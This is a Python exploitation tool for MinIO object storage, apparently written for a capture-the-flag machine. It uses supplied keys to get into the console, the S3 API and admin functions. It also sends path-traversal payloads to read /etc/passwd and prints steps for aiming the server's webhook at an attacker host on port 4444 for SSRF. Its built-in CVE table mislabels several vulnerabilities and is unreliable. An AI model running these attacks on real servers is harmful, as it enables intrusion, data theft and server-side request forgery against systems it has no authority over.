#!/usr/bin/env python3
"""
MinIO Security Assessment Tool
Comprehensive vulnerability scanner for MinIO instances
Author: d3vn0mi
GitHub: https://github.com/d3vhthnnni
"""

import requests
import subprocess
import json
import sys
import argparse
from urllib.parse import urljoin
import boto3
from botocore.client import Config
from botocore.exceptions import ClientError, NoCredentialsError
import hashlib
import hmac
import base64
from datetime import datetime

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    END = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
    ███╗   ███╗██╗███╗   ██╗██╗ ██████╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
    ████╗ ████║██║████╗  ██║██║██╔═══██╗    ██╔════╝██╔════╝██╔══██╗████╗  ██║
    ██╔████╔██║██║██╔██╗ ██║██║██║   ██║    ███████╗██║     ███████║██╔██╗ ██║
    ██║╚██╔╝██║██║██║╚██╗██║██║██║   ██║    ╚════██║██║     ██╔══██║██║╚██╗██║
    ██║ ╚═╝ ██║██║██║ ╚████║██║╚██████╔╝    ███████║╚██████╗██║  ██║██║ ╚████║
    ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝ ╚═════╝     ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
{Colors.END}
{Colors.BLUE}{'='*80}
   MinIO Security Assessment & Exploitation Tool
   Author: d3vn0mi | GitHub: github.com/d3vhthnnni
{'='*80}{Colors.END}
    """
    print(banner)

class MinIOScanner:
    def __init__(self, target, port, access_key, secret_key, bucket='randomfacts'):
        self.target = target
        self.port = port
        self.access_key = access_key
        self.secret_key = secret_key
        self.bucket = bucket
        self.endpoint = f"http://{target}:{port}"
        self.session = requests.Session()
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()
        
        self.results = {
            'console_access': False,
            'api_auth': False,
            'admin_privileges': False,
            'exposed_endpoints': [],
            'vulnerable_cves': [],
            'path_traversal': False,
            'webhook_capable': False,
            'mc_client_available': False,
            's3_access': False
        }
    
    def test_console_access(self):
        """Test MinIO console web interface access"""
        print(f"\n{Colors.BLUE}{'='*80}")
        print(f"[*] Test 1: MinIO Console Access")
        print(f"{'='*80}{Colors.END}\n")
        
        console_ports = [self.port, 9001, 9000]
        
        for port in console_ports:
            url = f"http://{self.target}:{port}"
            print(f"{Colors.CYAN}[*] Testing console at {url}...{Colors.END}")
            
            try:
                r = self.session.get(url, timeout=5)
                
                if r.status_code == 200:
                    # Check if it's MinIO console
                    if 'minio' in r.text.lower() or 'console' in r.text.lower():
                        print(f"{Colors.GREEN}[+] MinIO Console FOUND at {url}!{Colors.END}")
                        print(f"{Colors.YELLOW}[!] Try logging in with:{Colors.END}")
                        print(f"    Username: {self.access_key}")
                        print(f"    Password: {self.secret_key}")
                        self.results['console_access'] = url
                        return True
                    
            except Exception as e:
                if self.verbose:
                    print(f"{Colors.RED}[-] Error testing {url}: {e}{Colors.END}")
        
        print(f"{Colors.RED}[-] No accessible console found{Colors.END}")
        return False
    
    def test_api_authentication(self):
        """Test MinIO Console API authentication"""
        print(f"\n{Colors.BLUE}{'='*80}")
        print(f"[*] Test 2: Console API Authentication")
        print(f"{'='*80}{Colors.END}\n")
        
        api_endpoints = [
            f"{self.endpoint}/api/v1/login",
            f"http://{self.target}:9001/api/v1/login"
        ]
        
        for endpoint in api_endpoints:
            print(f"{Colors.CYAN}[*] Testing API login at {endpoint}...{Colors.END}")
            
            payload = {
                "accessKey": self.access_key,
                "secretKey": self.secret_key
            }
            
            try:
                r = self.session.post(
                    endpoint,
                    json=payload,
                    headers={"Content-Type": "application/json"},
                    timeout=5
                )
                
                if r.status_code == 200:
                    try:
                        data = r.json()
                        if 'token' in data or 'sessionId' in data:
                            print(f"{Colors.GREEN}[+] API Authentication SUCCESSFUL!{Colors.END}")
                            print(f"{Colors.GREEN}[+] Received auth token{Colors.END}")
                            self.results['api_auth'] = True
                            self.api_token = data.get('token', data.get('sessionId'))
                            return True
                    except:
                        pass
                        
            except Exception as e:
                if self.verbose:
                    print(f"{Colors.RED}[-] Error: {e}{Colors.END}")
        
        print(f"{Colors.RED}[-] API authentication failed{Colors.END}")
        return False
    
    def test_s3_access(self):
        """Test S3 API access with credentials"""
        print(f"\n{Colors.BLUE}{'='*80}")
        print(f"[*] Test 3: S3 API Access")
        print(f"{'='*80}{Colors.END}\n")
        
        try:
            s3_client = boto3.client(
                's3',
                endpoint_url=self.endpoint,
                aws_access_key_id=self.access_key,
                aws_secret_access_key=self.secret_key,
                config=Config(signature_version='s3v4'),
                region_name='us-east-1'
            )
            
            # Try to list buckets
            print(f"{Colors.CYAN}[*] Attempting to list buckets...{Colors.END}")
            response = s3_client.list_buckets()
            
            print(f"{Colors.GREEN}[+] S3 API Access SUCCESSFUL!{Colors.END}")
            print(f"{Colors.GREEN}[+] Found {len(response['Buckets'])} bucket(s):{Colors.END}")
            
            for bucket in response['Buckets']:
                print(f"    → {bucket['Name']}")
            
            # Try to list objects in target bucket
            try:
                print(f"\n{Colors.CYAN}[*] Listing objects in '{self.bucket}' bucket...{Colors.END}")
                response = s3_client.list_objects_v2(Bucket=self.bucket, MaxKeys=10)
                
                if 'Contents' in response:
                    print(f"{Colors.GREEN}[+] Found {len(response.get('Contents', []))} objects{Colors.END}")
                    for obj in response['Contents'][:5]:
                        print(f"    → {obj['Key']} ({obj['Size']} bytes)")
                
                self.results['s3_access'] = True
                self.s3_client = s3_client
                return True
                
            except Exception as e:
                print(f"{Colors.YELLOW}[!] Cannot list bucket contents: {e}{Colors.END}")
                
        except NoCredentialsError:
            print(f"{Colors.RED}[-] Invalid credentials{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[-] S3 access failed: {e}{Colors.END}")
        
        return False
    
    def test_mc_client(self):
        """Test if mc (MinIO Client) is available and can connect"""
        print(f"\n{Colors.BLUE}{'='*80}")
        print(f"[*] Test 4: MinIO Client (mc) Availability")
        print(f"{'='*80}{Colors.END}\n")
        
        # Check if mc is installed
        try:
            result = subprocess.run(['mc', '--version'], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                print(f"{Colors.GREEN}[+] mc client is installed{Colors.END}")
                print(f"    Version: {result.stdout.strip()}")
                
                # Try to configure alias
                print(f"\n{Colors.CYAN}[*] Configuring mc alias 'scanner'...{Colors.END}")
                cmd = [
                    'mc', 'alias', 'set', 'scanner',
                    self.endpoint,
                    self.access_key,
                    self.secret_key
                ]
                
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                
                if result.returncode == 0:
                    print(f"{Colors.GREEN}[+] mc alias configured successfully{Colors.END}")
                    
                    # Test listing
                    result = subprocess.run(['mc', 'ls', 'scanner'], capture_output=True, text=True, timeout=10)
                    if result.returncode == 0:
                        print(f"{Colors.GREEN}[+] mc can access MinIO instance{Colors.END}")
                        self.results['mc_client_available'] = True
                        
                        # Test admin privileges
                        self.test_admin_privileges()
                        return True
                
        except FileNotFoundError:
            print(f"{Colors.YELLOW}[!] mc client not installed{Colors.END}")
            print(f"{Colors.CYAN}[*] Install with:{Colors.END}")
            print(f"    wget https://dl.min.io/client/mc/release/linux-amd64/mc")
            print(f"    chmod +x mc && sudo mv mc /usr/local/bin/")
        except Exception as e:
            print(f"{Colors.RED}[-] Error testing mc: {e}{Colors.END}")
        
        return False
    
    def test_admin_privileges(self):
        """Test if credentials have admin privileges"""
        print(f"\n{Colors.CYAN}[*] Testing admin privileges...{Colors.END}")
        
        try:
            # Try admin info command
            result = subprocess.run(
                ['mc', 'admin', 'info', 'scanner'],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                print(f"{Colors.GREEN}[+] ADMIN PRIVILEGES CONFIRMED!{Colors.END}")
                print(f"{Colors.GREEN}[+] Server info:{Colors.END}")
                print(result.stdout)
                self.results['admin_privileges'] = True
                
                # Try to list users
                result = subprocess.run(
                    ['mc', 'admin', 'user', 'list', 'scanner'],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                
                if result.returncode == 0:
                    print(f"{Colors.GREEN}[+] Can list users:{Colors.END}")
                    print(result.stdout)
                
                return True
            else:
                print(f"{Colors.RED}[-] No admin privileges{Colors.END}")
                
        except Exception as e:
            print(f"{Colors.RED}[-] Error checking admin: {e}{Colors.END}")
        
        return False
    
    def test_exposed_endpoints(self):
        """Test for exposed MinIO endpoints"""
        print(f"\n{Colors.BLUE}{'='*80}")
        print(f"[*] Test 5: Exposed Endpoints")
        print(f"{'='*80}{Colors.END}\n")
        
        endpoints = [
            '/minio/metrics',
            '/minio/v2/metrics/cluster',
            '/minio/health/live',
            '/minio/health/ready',
            '/minio/debug/pprof/',
            '/minio/prometheus/metrics'
        ]
        
        for endpoint in endpoints:
            url = urljoin(self.endpoint, endpoint)
            print(f"{Colors.CYAN}[*] Testing {endpoint}...{Colors.END}", end=' ')
            
            try:
                r = self.session.get(url, timeout=5)
                
                if r.status_code == 200:
                    print(f"{Colors.GREEN}✓ ACCESSIBLE{Colors.END}")
                    self.results['exposed_endpoints'].append(endpoint)
                    
                    # Check for sensitive info
                    if 'version' in r.text.lower():
                        print(f"{Colors.YELLOW}    [!] May contain version info{Colors.END}")
                    if 'error' not in r.text.lower() and len(r.text) > 100:
                        print(f"{Colors.YELLOW}    [!] Returns substantial data ({len(r.text)} bytes){Colors.END}")
                else:
                    print(f"{Colors.RED}✗ ({r.status_code}){Colors.END}")
                    
            except Exception as e:
                print(f"{Colors.RED}✗ Error{Colors.END}")
        
        if self.results['exposed_endpoints']:
            print(f"\n{Colors.GREEN}[+] Found {len(self.results['exposed_endpoints'])} exposed endpoints{Colors.END}")
            return True
        else:
            print(f"\n{Colors.RED}[-] No exposed endpoints found{Colors.END}")
        
        return False
    
    def check_version(self):
        """Try to identify MinIO version"""
        print(f"\n{Colors.BLUE}{'='*80}")
        print(f"[*] Test 6: Version Detection")
        print(f"{'='*80}{Colors.END}\n")
        
        try:
            r = self.session.head(self.endpoint, timeout=5)
            server_header = r.headers.get('Server', '')
            
            if server_header:
                print(f"{Colors.GREEN}[+] Server Header: {server_header}{Colors.END}")
                
                if 'MinIO' in server_header:
                    # Extract version
                    import re
                    version_match = re.search(r'RELEASE\.(\d{4}-\d{2}-\d{2}T\d{2}-\d{2}-\d{2}Z)', server_header)
                    if version_match:
                        version = version_match.group(1)
                        print(f"{Colors.GREEN}[+] MinIO Version: {version}{Colors.END}")
                        self.results['version'] = version
                        
                        # Check for known vulnerable versions
                        self.check_known_vulnerabilities(version)
                        return True
            else:
                print(f"{Colors.YELLOW}[!] No Server header found{Colors.END}")
                
        except Exception as e:
            print(f"{Colors.RED}[-] Error detecting version: {e}{Colors.END}")
        
        return False
    
    def check_known_vulnerabilities(self, version=None):
        """Check for known CVEs"""
        print(f"\n{Colors.CYAN}[*] Checking for known vulnerabilities...{Colors.END}")
        
        known_cves = {
            'CVE-2023-28432': {
                'desc': 'Information Disclosure & Privilege Escalation',
                'severity': 'HIGH',
                'affected': 'RELEASE.2023-03-20T20-16-18Z and earlier'
            },
            'CVE-2023-28434': {
                'desc': 'Cluster Admin Privilege Escalation',
                'severity': 'HIGH',
                'affected': 'RELEASE.2023-03-20T20-16-18Z and earlier'
            },
            'CVE-2024-24747': {
                'desc': 'Path Traversal in Console API',
                'severity': 'CRITICAL',
                'affected': 'Console versions before RELEASE.2024-01-31T23-36-00Z'
            },
            'CVE-2021-21287': {
                'desc': 'Authentication Bypass',
                'severity': 'CRITICAL',
                'affected': 'RELEASE.2021-01-30T00-20-58Z and earlier'
            }
        }
        
        print(f"\n{Colors.YELLOW}[*] Known MinIO CVEs:{Colors.END}")
        for cve, info in known_cves.items():
            print(f"\n{Colors.CYAN}  {cve} ({info['severity']}){Colors.END}")
            print(f"    {info['desc']}")
            print(f"    Affected: {info['affected']}")
        
        if version:
            print(f"\n{Colors.YELLOW}[!] Manual verification needed for version: {version}{Colors.END}")
        
        return known_cves
    
    def test_path_traversal(self):
        """Test for path traversal vulnerabilities"""
        print(f"\n{Colors.BLUE}{'='*80}")
        print(f"[*] Test 7: Path Traversal (CVE-2024-24747)")
        print(f"{'='*80}{Colors.END}\n")
        
        payloads = [
            '/api/v1/..%2f..%2f..%2f..%2fetc%2fpasswd',
            '/api/v1/../../../../etc/passwd',
            '/../../../etc/passwd'
        ]
        
        console_ports = [self.port, 9001, 9000]
        
        for port in console_ports:
            for payload in payloads:
                url = f"http://{self.target}:{port}{payload}"
                print(f"{Colors.CYAN}[*] Testing: {payload} on port {port}...{Colors.END}", end=' ')
                
                try:
                    r = self.session.get(url, timeout=5)
                    
                    if 'root:' in r.text or 'bin:' in r.text:
                        print(f"{Colors.GREEN}✓ VULNERABLE!{Colors.END}")
                        print(f"{Colors.GREEN}[+] Successfully read /etc/passwd:{Colors.END}")
                        print(r.text[:200])
                        self.results['path_traversal'] = True
                        self.results['vulnerable_cves'].append('CVE-2024-24747')
                        return True
                    else:
                        print(f"{Colors.RED}✗{Colors.END}")
                        
                except Exception as e:
                    print(f"{Colors.RED}✗{Colors.END}")
        
        print(f"\n{Colors.RED}[-] Not vulnerable to path traversal{Colors.END}")
        return False
    
    def test_webhook_capability(self):
        """Test if webhook notifications can be configured"""
        print(f"\n{Colors.BLUE}{'='*80}")
        print(f"[*] Test 8: Webhook Notification Capability")
        print(f"{'='*80}{Colors.END}\n")
        
        if not self.results['mc_client_available']:
            print(f"{Colors.YELLOW}[!] mc client not available, skipping webhook test{Colors.END}")
            return False
        
        if not self.results['admin_privileges']:
            print(f"{Colors.YELLOW}[!] No admin privileges, cannot configure webhooks{Colors.END}")
            return False
        
        print(f"{Colors.CYAN}[*] Testing webhook configuration capability...{Colors.END}")
        
        try:
            # Try to get current config
            result = subprocess.run(
                ['mc', 'admin', 'config', 'get', 'scanner', 'notify_webhook'],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                print(f"{Colors.GREEN}[+] Can access webhook configuration!{Colors.END}")
                print(f"{Colors.GREEN}[+] This means you can set up SSRF/callbacks!{Colors.END}")
                self.results['webhook_capable'] = True
                
                print(f"\n{Colors.YELLOW}[!] To exploit:{Colors.END}")
                print(f"    1. mc admin config set scanner notify_webhook:1 endpoint='http://YOUR_IP:4444'")
                print(f"    2. mc admin service restart scanner")
                print(f"    3. echo test | mc pipe scanner/{self.bucket}/trigger.txt")
                print(f"    4. MinIO sends HTTP request to your server!")
                
                return True
                
        except Exception as e:
            print(f"{Colors.RED}[-] Error testing webhooks: {e}{Colors.END}")
        
        return False
    
    def generate_report(self):
        """Generate final assessment report"""
        print(f"\n{Colors.MAGENTA}{'='*80}")
        print(f"{'='*80}")
        print(f"ASSESSMENT REPORT")
        print(f"{'='*80}")
        print(f"{'='*80}{Colors.END}\n")
        
        print(f"{Colors.CYAN}Target: {self.target}:{self.port}{Colors.END}")
        print(f"{Colors.CYAN}Bucket: {self.bucket}{Colors.END}\n")
        
        # Summary
        total_tests = 8
        passed_tests = sum([
            self.results['console_access'] != False,
            self.results['api_auth'],
            self.results['s3_access'],
            self.results['mc_client_available'],
            self.results['admin_privileges'],
            len(self.results['exposed_endpoints']) > 0,
            self.results['path_traversal'],
            self.results['webhook_capable']
        ])
        
        print(f"{Colors.BOLD}Tests Passed: {passed_tests}/{total_tests}{Colors.END}\n")
        
        # Detailed results
        print(f"{Colors.BLUE}Detailed Results:{Colors.END}\n")
        
        findings = []
        
        if self.results['console_access']:
            findings.append(('CRITICAL', 'MinIO Console Accessible', self.results['console_access']))
        
        if self.results['api_auth']:
            findings.append(('HIGH', 'Console API Authentication Working', 'Can obtain auth tokens'))
        
        if self.results['s3_access']:
            findings.append(('HIGH', 'S3 API Access Confirmed', 'Full bucket access'))
        
        if self.results['admin_privileges']:
            findings.append(('CRITICAL', 'Admin Privileges Confirmed', 'Full administrative access'))
        
        if self.results['webhook_capable']:
            findings.append(('CRITICAL', 'Webhook Configuration Possible', 'Can set up SSRF/callbacks'))
        
        if self.results['path_traversal']:
            findings.append(('CRITICAL', 'Path Traversal Vulnerability', 'CVE-2024-24747'))
        
        if self.results['exposed_endpoints']:
            findings.append(('MEDIUM', f"{len(self.results['exposed_endpoints'])} Exposed Endpoints", ', '.join(self.results['exposed_endpoints'][:3])))
        
        # Print findings
        for severity, title, detail in findings:
            if severity == 'CRITICAL':
                color = Colors.RED
            elif severity == 'HIGH':
                color = Colors.YELLOW
            else:
                color = Colors.BLUE
            
            print(f"{color}[{severity}]{Colors.END} {title}")
            print(f"         → {detail}\n")
        
        # Exploitation recommendations
        print(f"\n{Colors.MAGENTA}{'='*80}")
        print(f"EXPLOITATION RECOMMENDATIONS")
        print(f"{'='*80}{Colors.END}\n")
        
        if self.results['admin_privileges'] and self.results['webhook_capable']:
            print(f"{Colors.GREEN}[!] PRIMARY ATTACK VECTOR: Webhook SSRF/RCE{Colors.END}")
            print(f"    Priority: ⭐⭐⭐⭐⭐")
            print(f"    Steps:")
            print(f"      1. Set webhook endpoint to your server")
            print(f"      2. Trigger notification by uploading file")
            print(f"      3. Receive callback from MinIO server")
            print(f"      4. Potential for SSRF or RCE\n")
        
        if self.results['console_access']:
            print(f"{Colors.GREEN}[!] ATTACK VECTOR: MinIO Console Access{Colors.END}")
            print(f"    Priority: ⭐⭐⭐⭐")
            print(f"    Steps:")
            print(f"      1. Login at: {self.results['console_access']}")
            print(f"      2. Explore admin panel for misconfigurations")
            print(f"      3. Look for service management options\n")
        
        if self.results['path_traversal']:
            print(f"{Colors.GREEN}[!] ATTACK VECTOR: Path Traversal (CVE-2024-24747){Colors.END}")
            print(f"    Priority: ⭐⭐⭐⭐")
            print(f"    Can read arbitrary files from server\n")
        
        if self.results['s3_access'] and not self.results['admin_privileges']:
            print(f"{Colors.YELLOW}[!] ATTACK VECTOR: S3 Bucket Manipulation{Colors.END}")
            print(f"    Priority: ⭐⭐⭐")
            print(f"    Limited to bucket operations only\n")
        
        # Next steps
        print(f"\n{Colors.CYAN}{'='*80}")
        print(f"NEXT STEPS")
        print(f"{'='*80}{Colors.END}\n")
        
        if self.results['admin_privileges']:
            print(f"1. {Colors.GREEN}Configure webhook for SSRF{Colors.END}")
            print(f"2. Explore admin panel via console")
            print(f"3. Check for service restart/update options")
        elif self.results['console_access']:
            print(f"1. {Colors.GREEN}Login to console and explore{Colors.END}")
            print(f"2. Look for privilege escalation opportunities")
        elif self.results['s3_access']:
            print(f"1. {Colors.GREEN}Enumerate all buckets and objects{Colors.END}")
            print(f"2. Look for sensitive data in buckets")
            print(f"3. Try uploading files to different locations")
        else:
            print(f"{Colors.YELLOW}Limited access - consider alternative attack vectors{Colors.END}")
        
        print()

def main():
    print_banner()
    
    parser = argparse.ArgumentParser(
        description='MinIO Security Assessment Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""{Colors.CYAN}Examples:{Colors.END}
  python3 {sys.argv[0]} -t facts.htb -p 54321 -a AKIAD7EA7D9EB7F9027B -s SECRET_KEY
  python3 {sys.argv[0]} -t 10.10.11.50 -p 54321 -a ACCESS_KEY -s SECRET_KEY -v
  python3 {sys.argv[0]} -t facts.htb -p 54321 -a ACCESS_KEY -s SECRET_KEY -b mybucket

{Colors.CYAN}Author:{Colors.END} d3vn0mi
{Colors.CYAN}GitHub:{Colors.END} https://github.com/d3vhthnnni
        """
    )
    
    parser.add_argument('-t', '--target', required=True, help='Target hostname or IP')
    parser.add_argument('-p', '--port', type=int, default=54321, help='MinIO port (default: 54321)')
    parser.add_argument('-a', '--access-key', required=True, help='AWS access key')
    parser.add_argument('-s', '--secret-key', required=True, help='AWS secret key')
    parser.add_argument('-b', '--bucket', default='randomfacts', help='Target bucket name (default: randomfacts)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    print(f"{Colors.YELLOW}[*] Target: {args.target}:{args.port}{Colors.END}")
    print(f"{Colors.YELLOW}[*] Access Key: {args.access_key}{Colors.END}")
    print(f"{Colors.YELLOW}[*] Bucket: {args.bucket}{Colors.END}\n")
    
    scanner = MinIOScanner(
        args.target,
        args.port,
        args.access_key,
        args.secret_key,
        args.bucket
    )
    scanner.verbose = args.verbose
    
    # Run all tests
    try:
        scanner.test_console_access()
        scanner.test_api_authentication()
        scanner.test_s3_access()
        scanner.test_mc_client()
        scanner.test_exposed_endpoints()
        scanner.check_version()
        scanner.test_path_traversal()
        scanner.test_webhook_capability()
        
        # Generate final report
        scanner.generate_report()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Scan interrupted by user{Colors.END}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error during scan: {e}{Colors.END}")
        sys.exit(1)

if __name__ == '__main__':
    main()
